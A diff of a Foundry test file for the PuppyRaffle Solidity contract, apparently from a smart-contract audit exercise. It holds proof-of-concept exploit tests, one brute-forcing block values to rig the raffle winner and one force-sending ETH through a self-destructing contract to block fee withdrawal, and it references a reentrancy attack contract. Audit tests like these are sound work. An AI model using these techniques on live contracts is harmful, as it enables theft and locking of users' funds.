@@ -5,17 +5,19 @@ pragma experimental ABIEncoderV2;
 import {Test, console} from "lib/forge-std/src/Test.sol";
 import {PuppyRaffle} from "../src/PuppyRaffle.sol";
 import {Attack} from "../src/ReentrencyAttack.sol";
+import {SelfDestruct} from "../src/SelfDestruct.sol";
 
 contract PuppyRaffleTest is Test {
     PuppyRaffle puppyRaffle;
     Attack attack;
+    SelfDestruct selfDestruct;
 
     uint256 entranceFee = 1e18;
     address playerOne = address(1);
     address playerTwo = address(2);
     address playerThree = address(3);
     address playerFour = address(4);
-    address feeAddress = address(99);
+    address feeAddress = makeAddr("feeAddress");
     uint256 duration = 1 days;
 
     function setUp() public {
@@ -26,6 +28,7 @@ contract PuppyRaffleTest is Test {
         );
 
         attack = new Attack(address(puppyRaffle));
+        selfDestruct = new SelfDestruct(address(puppyRaffle));
     }
 
     //////////////////////
@@ -309,23 +312,15 @@ contract PuppyRaffleTest is Test {
 
         // Simulate miner manipulation by trying different values
         for (uint i = 1; i < 1000; i++) {
-            console.log("run: ", i);
             manipulatedPrevRandao = uint256(keccak256(abi.encodePacked(i)));
             manipulatedTimestamp = raffleEndTime + i;
             manipulatedBlockNumber = block.number + i;
-            console.log("manipulatedTimestamp", manipulatedTimestamp);
-            console.log("manipulatedPrevRandao", manipulatedPrevRandao);
-            console.log("manipulatedBlockNumber", manipulatedBlockNumber);
 
             // Calculate the winnerIndex with manipulated values
             uint256 winnerIndex = uint256(keccak256(abi.encodePacked(advisory, manipulatedTimestamp, manipulatedPrevRandao))) % (playersARG.length + 1);
 
             // Break for loop if winnerIndex == advisory index
             if (winnerIndex == playersARG.length ){
-                console.log("Winner index: ", winnerIndex);
-                console.log("Simulated player length: ", playersARG.length + 1);
-                console.log("manipulatedTimestamp: ", manipulatedTimestamp);
-                console.log("manipulatedPrevRandao: ", manipulatedPrevRandao);
                 break;
             }
         }
@@ -335,11 +330,6 @@ contract PuppyRaffleTest is Test {
         vm.warp(manipulatedTimestamp);
         vm.roll(manipulatedBlockNumber);
         vm.prevrandao(manipulatedPrevRandao);
-        console.log("-------------------------");
-        console.log("manipulatedTimestamp: ", manipulatedTimestamp);
-        console.log("manipulatedPrevRandao: ", manipulatedPrevRandao);
-        console.log("Manipulated block number: ", manipulatedBlockNumber);
-        console.log("balance of puppyraffle: ", address(puppyRaffle).balance);
         puppyRaffle.selectWinner();
         vm.stopPrank();
 
@@ -348,4 +338,46 @@ contract PuppyRaffleTest is Test {
         assertEq(puppyRaffle.previousWinner(), advisory);
         assertEq(advisory.balance, expectedPayout);
     }
+
+    /*//////////////////////////////////////////////////////////////
+                             CANT WITHDRAW
+    //////////////////////////////////////////////////////////////*/
+        
+    function test_CantWithdraw() public {
+        // Give the entrance fee * 4 to enter for all players
+        vm.deal(one, entranceFee * 4);
+
+        // Give advisory entrance
+        vm.deal(advisory, entranceFee);
+
+        // Fund Self destructing contract
+        vm.deal(address(selfDestruct), 20 ether);
+
+        // ARGS for entering enterRaffle()
+        address[] memory playersARG = new address[](4);
+        playersARG[0] = one;
+        playersARG[1] = two;
+        playersARG[2] = three;
+        playersARG[3] = four;
+        address[] memory advisoryARG = new address[](1);
+        advisoryARG[0] = advisory; 
+
+        vm.prank(one);
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(playersARG);
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        vm.startPrank(advisory);
+        selfDestruct.destructAndSendEth();
+        puppyRaffle.selectWinner();
+        vm.expectRevert();
+        puppyRaffle.withdrawFees();
+        vm.stopPrank();
+    }
+
+    /*//////////////////////////////////////////////////////////////
+                                OVERFLOW
+    //////////////////////////////////////////////////////////////*/
+
 }
